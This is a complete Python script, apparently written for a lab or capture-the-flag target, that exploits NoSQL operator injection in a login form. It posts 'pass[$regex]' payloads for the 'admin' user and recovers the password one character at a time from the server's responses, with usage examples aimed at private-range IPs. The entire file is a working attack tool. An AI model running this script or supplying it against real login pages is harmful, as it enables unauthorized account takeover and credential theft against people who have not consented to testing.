import requests
import argparse
import sys

# ==============================================================================
# TERMINAL USAGE EXAMPLES
# 
# Example 1: Brute force with known length and custom failure string
# python3 brute.py -u http://10.66.146.113/login.php -pl 5 -f "err=1"
#
# Example 2: Brute force looking for "Invalid" in the response body
# python3 brute.py -u http://10.10.10.10/auth -f "Invalid"
# ==============================================================================

parser = argparse.ArgumentParser(description="NoSQL Regex Password Brute Forcer")
parser.add_argument("-u", "--url", required=True, help="Target URL")
parser.add_argument("-pl", "--length", type=int, help="Password length")
parser.add_argument("-f", "--fail", required=True, help="String that identifies a failed attempt")
args = parser.parse_args()

characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
password = ""

print(f"[*] Target: {args.url}")
print(f"[*] Failure String: '{args.fail}'")

try:
    while True:
        if args.length and len(password) == args.length:
            break
            
        found_char = False
        for char in characters:
            regex_payload = f"^{password}{char}.*$"
            data = {"user": "admin", "pass[$regex]": regex_payload, "remember": "on"}
            
            try:
                # allow_redirects=False is still key to see the initial response
                response = requests.post(args.url, data=data, allow_redirects=False, timeout=5)
                
                # We combine ALL headers and the body into one searchable string
                header_string = str(response.headers)
                body_string = response.text
                full_raw_response = header_string + body_string
                
                # Logic: If the failure string is MISSING from the whole response, it's a match
                if args.fail not in full_raw_response:
                    password += char
                    print(f"[+] Current Password: {password}")
                    found_char = True
                    break
            except requests.exceptions.RequestException as e:
                print(f"[!] Connection error: {e}")
                sys.exit(1)
                
        if not found_char:
            print("[!] No more characters found.")
            break

    print(f"\n[SUCCESS] Final Password: {password}")

except KeyboardInterrupt:
    print("\n[!] Script interrupted.")
    sys.exit(0)
